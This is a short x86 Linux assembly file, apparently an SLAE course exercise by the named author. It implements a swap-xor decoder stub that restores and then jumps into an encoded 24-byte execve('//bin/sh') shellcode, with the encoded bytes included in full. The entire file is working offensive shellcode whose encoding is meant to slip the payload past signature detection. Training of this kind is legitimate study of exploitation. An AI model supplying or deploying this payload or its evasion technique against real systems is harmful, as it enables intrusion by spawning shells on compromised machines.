;Architecture    : x86
;OS              : Linux
;Author          : Elham AlShehri
;ID              : SLAE-1538
;Shellcode Size  : execve = 24 bytes
;Description     : Decoder of swap-xor encoder

global _start			

section .text
_start:

	jmp short call_shellcode

decoder:
	pop esi					; shellcode address


decode: 

	;; 1. xoring

	xor byte [esi]    , 0xEE		; XOR with the marker
	xor byte [esi + 1], 0xEE		; XOR with the marker
	
	;; check if we reached the marker
	jz shellcode
	
	;; 2. swapping				; swap each 2 blocks of bytes
	mov bl, [esi]
	mov al, [esi + 1]
	mov [esi + 1] , bl
	mov [esi] , al
	
	;; 3. Loop
	add esi, 2				; mov 2 bytes
	jmp decode				; loop


call_shellcode:
	call decoder
	
	;; execve('//bin/sh' , NULL, NULL) padded with 0xEE
	shellcode: db 0x2e,0xdf,0x86,0xbe,0xc1,0xc1,0x86,0x9d,0xc1,0x86,0x87,0x8c,0x67,0x80,0xbe,0x0d,0x0c,0x67,0x3f,0x67,0xe5,0x5e,0x6e,0x23,0xee,0xee